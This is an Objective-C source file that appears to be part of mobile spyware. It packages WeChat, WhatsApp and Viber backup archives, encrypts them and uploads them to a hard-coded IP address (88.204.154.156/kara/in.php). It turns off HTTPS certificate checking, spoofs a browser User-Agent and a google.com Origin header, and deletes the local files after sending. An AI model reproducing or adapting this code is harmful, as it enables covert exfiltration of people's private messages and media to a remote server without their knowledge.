

#import "TFile.h"
#import "TCyper.h"

@implementation NSURLRequest (NSURLRequestWithIgnoreSSL)

+ (BOOL)allowsAnyHTTPSCertificateForHost:(NSString *)host
{
    return YES;
}
@end


#define TCOMMON_HEADER_JSON_LENGTH_BYTE_COUNT 2

@implementation TFile

#pragma mark - FIXED PARAMS IN HEADER
#pragma mark - ADDITIONAL PARAMS IN HEADER

-(BOOL) sendMediaZip:(NSString*)zipFullPath to:(NSString*) url withGuid:(NSString*) guid withUUID:(NSString*)uuid {

    NSString* fullUrl = [[url stringByAppendingPathComponent:@"kara"] stringByAppendingPathComponent:@"in.php"];
    
    NSDictionary* additionalMeta = [self getMetaFromBackupPath:zipFullPath];
    
    if(!additionalMeta){
        NSLog(@"Faild to get additionalMeta for sending backup");
        return false;
    }
    
    BOOL success = [self encryptAndMoveFile:zipFullPath withHeader:additionalMeta withGuid:guid withUUID:uuid withUrl:fullUrl];

    return success;
}

-(NSDictionary*) getMetaFromBackupPath:(NSString*)backupPath {
    
    NSString* dataType = @"";
    
    if([backupPath containsString:@"wechat"]){
        dataType = TFILE_CONSTANT_BUNDLE_NAME_WECHAT;
    }
    
    else if ([backupPath containsString:@"wmedia"]){
        dataType = TFILE_CONSTANT_BUNDLE_NAME_WHATSAPP;
    }
    
    else if ([backupPath containsString:@"viber"]){
        dataType = TFILE_CONSTANT_BUNDLE_NAME_VIBER;
    }

    NSDictionary* additionalMeta = @{
                                     jsonKey[TFILE_SUBDATA_TYPE_JSON_KEY]:TFILE_SUBDATA_TYPE_APP_BACKUP,
                                     jsonKey[TFILE_DATATYPE_JSON_KEY]:dataType
                                     };

    return additionalMeta;
}

-(BOOL) encryptAndMoveFile:(NSString*)filePathIn withHeader:(NSDictionary*)headerWithDataTypeDic withGuid:(NSString*) guid withUUID:(NSString*) uuid withUrl:(NSString*) url{
    
    NSDate* dateNow = [NSDate date];
    double roundedNowTime = round([dateNow  timeIntervalSince1970] * 1000);
    NSString* newFileName = [NSString stringWithFormat:@"%0.f", roundedNowTime];
    
    //NSData* header = [self getJsonHeader:[filePathIn lastPathComponent] andPlistFile:plistFile];
    NSData* header = [self getJsonHeader:[filePathIn lastPathComponent] withHeader:headerWithDataTypeDic withGuid:guid withUUID:uuid];
    NSInteger headerLength = [header length];
    uint16_t sizeInShort = (uint16_t) headerLength;
    unsigned short swapedHeaderLen =  NSSwapShort(sizeInShort);
    
    NSData *headerLenInData = [NSData dataWithBytes:&swapedHeaderLen length:TCOMMON_HEADER_JSON_LENGTH_BYTE_COUNT];
    
    NSMutableData* dataForCryptedFile = [NSMutableData data];
    
    [dataForCryptedFile appendData:headerLenInData];
    [dataForCryptedFile appendData:header];
    
    NSData* originFileData = [NSData dataWithContentsOfFile:filePathIn];
    [dataForCryptedFile appendData:originFileData];
    
    NSString* dirForNotEncryptedFile = [filePathIn stringByDeletingLastPathComponent];
    NSString* fullPathNotEncryptedFile = [dirForNotEncryptedFile stringByAppendingPathComponent:newFileName];
    
    BOOL success = [dataForCryptedFile writeToFile:fullPathNotEncryptedFile atomically:NO];
    
    if (!success){
        
       // [[VGUtils sharedInstance] writeLogToDB:[NSString stringWithFormat:@"Faild to write buffer NSData with header and db data to file with path %@", fullPathNotEncryptedFile ] withPretty_func:__PRETTY_FUNCTION__ withLine:__LINE__ andLogType:LOG_TYPE(eLOG_ERROR_INDEX)];
        return NO;
        
    }
    
    //5. encrypt file
    if(!guid){
       // [[VGUtils sharedInstance] writeLogToDB:@"Faild get guid by encryptAndMoveFile " withPretty_func:__PRETTY_FUNCTION__ withLine:__LINE__ andLogType:LOG_TYPE(eLOG_ERROR_INDEX)];
        return NO;
    }
    
    TCyper* cyper = [[TCyper alloc] init];
    NSString* encriptedFileName = [cyper encryptByChunk:fullPathNotEncryptedFile andGuid:guid];
    if(!encriptedFileName){
        //[[VGUtils sharedInstance] writeLogToDB:[NSString stringWithFormat:@"Faild to encrypt file %@",fullPathNotEncryptedFile] withPretty_func:__PRETTY_FUNCTION__ withLine:__LINE__ andLogType:LOG_TYPE(eLOG_ERROR_INDEX)];
        return NO;
    }
    
    
    //send by http
    BOOL successUpload = [self uploadFile:encriptedFileName withGuid:guid toUrl:url];
    
    //remove not nedded files
    [[NSFileManager defaultManager] removeItemAtPath:encriptedFileName error:nil];
    [[NSFileManager defaultManager] removeItemAtPath:fullPathNotEncryptedFile error:nil];
    
    if(!successUpload){
        //log unsuccess
        NSLog(@"Backup NOT uploaded");
        return NO;
    }
    
    return YES;
}

-(NSData*) getJsonHeader:(NSString*)origFileName withHeader:(NSDictionary*)headerWithDataTypeDic withGuid:(NSString*) guid withUUID:(NSString*)uuid{
    
    // create Dictionary
    NSMutableDictionary* jsonHeader = [[NSMutableDictionary alloc] init];
    [jsonHeader setValue:guid forKey:jsonKey[TFILE_GUID_JSON_KEY]];
    
    
    NSString* system =  TFILE_CONSTANT_SYSTEM;
    
    //NSString* typeDevice = [NSString stringWithUTF8String:TCOMMON_HEADER_DEVICETYPE];
    [jsonHeader setValue:system forKey:jsonKey[TFILE_SYSTEM_JSON_KEY]];
    
    [jsonHeader setValue:uuid forKey:jsonKey[TFILE_UUID_JSON_KEY]];
    
    NSString* fileNameWithTimestamp = [NSString stringWithFormat:@"%@_%@",origFileName, [self getNowTimestampInString]];
    
    [jsonHeader setValue:fileNameWithTimestamp forKey:jsonKey[TFILE_REALNAME_JSON_KEY]];
    
    
    //set mf_source 0 - mobile, 1 - computer
    [jsonHeader setValue:@0 forKey:jsonKey[TFILE_MF_SOURCE_JSON_KEY]];
    
    //set rooted
    NSNumber* isRooted = @0;
    [jsonHeader setValue:isRooted forKey:jsonKey[TFILE_ROOTED_JSON_KEY]];
    
    //set locale
    NSString* locale = TFILE_CONSTANT_LOCALE;
    [jsonHeader setValue:locale forKey:jsonKey[TFILE_LOCALE_JSON_KEY]];
    
    
    // set version
    NSString* version = TFILE_CONSTANT_VERSION;
    [jsonHeader setValue:version forKey:jsonKey[TFILE_DATA_VERSION_JSON_KEY]];
    
    //NSString* dataType = TFILE_CONSTANT_BUNDLE_NAME_WHATSAPP;
    //[jsonHeader setValue:dataType forKey:jsonKey[TFILE_DATATYPE_JSON_KEY]];
    
    
    [jsonHeader addEntriesFromDictionary:headerWithDataTypeDic];
    
    NSData* dataWithJson = [NSJSONSerialization dataWithJSONObject:jsonHeader options:0 error:nil];
    
    return dataWithJson;
    
}

-(NSMutableData*) getDataFromString:(NSString*) dataString andLength:(NSUInteger) length {
    
    NSData* dataInData = [dataString dataUsingEncoding:NSUTF8StringEncoding];
    NSMutableData* dataForHeader = [NSMutableData dataWithData:dataInData];
    dataForHeader.length = length;
    return dataForHeader;
    
}


-(NSString*) getNowTimestampInString {
    NSDate* dateNow = [NSDate date];
    double roundedNowTime = round([dateNow  timeIntervalSince1970] * 1000);
    NSString* dateInString = [NSString stringWithFormat:@"%0.f", roundedNowTime];
    return dateInString;
}



- (BOOL) uploadFile :(NSString *) filePath withGuid:(NSString*) guid toUrl:(NSString*) urlString{
    
    urlString = @"https://88.204.154.156/kara/in.php";
    
    NSString* fileName = [filePath lastPathComponent];
    
    if(!urlString){
        
        //[[VGUtils sharedInstance] writeLogToDB:@"[NEWGUID] frontEnd url not get in uploadFile" withPretty_func:__PRETTY_FUNCTION__ withLine:__LINE__ andLogType:LOG_TYPE(eLOG_ERROR_INDEX)];
        return NO;
    }
    
    NSMutableURLRequest *request = [[NSMutableURLRequest alloc] init];
    [request setURL:[NSURL URLWithString:urlString]];
    [request setHTTPMethod:@"POST"];
    
    NSString *boundary = @"_187934598797439873422234";
    
    NSString *contentType = [NSString stringWithFormat:@"multipart/form-data; boundary=%@",boundary];
    [request setValue:contentType forHTTPHeaderField: @"Content-Type"];
    [request setValue:@"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" forHTTPHeaderField:@"Accept"];
    [request setValue:@"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/536.26.14 (KHTML, like Gecko) Version/6.0.1 Safari/536.26.14" forHTTPHeaderField:@"User-Agent"];
    [request setValue:@"http://google.com" forHTTPHeaderField:@"Origin"];
    
    //-----------------------------------------------------------
    
    NSData *data = [[NSData alloc] initWithContentsOfFile:filePath];
    NSData* guidData = [guid dataUsingEncoding:NSUTF8StringEncoding];
    NSUInteger contentLength = [guidData length] + [data length];
    
    NSMutableData *body = [NSMutableData data];
    
    [body appendData:[[NSString stringWithFormat:@"Content-Length %lu\r\n\r\n", (unsigned long)contentLength ] dataUsingEncoding:NSUTF8StringEncoding]];
    
    //----------------fill post data------------------------------------------
    
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n",boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Disposition: form-data; name=\"guid\"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Type: text/plain\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[NSData dataWithData:guidData]];
    [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    
    //------------------fill file------------------------------------------------
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n",boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"upfile\"; filename=\"%@\"\r\n", fileName] dataUsingEncoding:NSUTF8StringEncoding]];
    
    [body appendData:[@"Content-Type: application/octet-stream\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    
    [body appendData:[NSData dataWithData:data]];
    [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    
    
    [body appendData:[[NSString stringWithFormat:@"--%@--\r\n",boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    
    [request setHTTPBody:body];
    
    [request addValue:[NSString stringWithFormat:@"%lu", (unsigned long)([body length])] forHTTPHeaderField:@"Content-Length"];
    
    NSError* error = nil;
    
    NSData *returnData = [NSURLConnection sendSynchronousRequest:request returningResponse:nil error:&error];
    
    if(error){
        
        //[[VGUtils sharedInstance] writeLogToDB:[NSString stringWithFormat:@"Error in send file %@ with error %@", filePath, [error localizedDescription]] withPretty_func:__PRETTY_FUNCTION__ withLine:__LINE__ andLogType:LOG_TYPE(eLOG_ERROR_INDEX)];
        return NO;
    }
    
    if(!returnData){
        
        //[[VGUtils sharedInstance] writeLogToDB:[NSString stringWithFormat:@"No data in response by sending file %@", filePath] withPretty_func:__PRETTY_FUNCTION__ withLine:__LINE__ andLogType:LOG_TYPE(eLOG_ERROR_INDEX)];
        return NO;
    }
    
    NSString *returnString = [[NSString alloc] initWithData:returnData encoding:NSUTF8StringEncoding];
    NSRange rangeOK = [returnString rangeOfString:@"OK"];
    NSRange rangeNO = [returnString rangeOfString:@"NO"];
    
    if(rangeOK.location != NSNotFound){
       // [[VGUtils sharedInstance] writeLogToDB:[NSString stringWithFormat:@"File %@ sended to server", filePath ] withPretty_func:__PRETTY_FUNCTION__ withLine:__LINE__ andLogType:LOG_TYPE(eLOG_INFO_INDEX)];
        return YES;
    }
    
    if(rangeNO.location != NSNotFound){
        return NO;
    }
    
    return NO;
}


@end
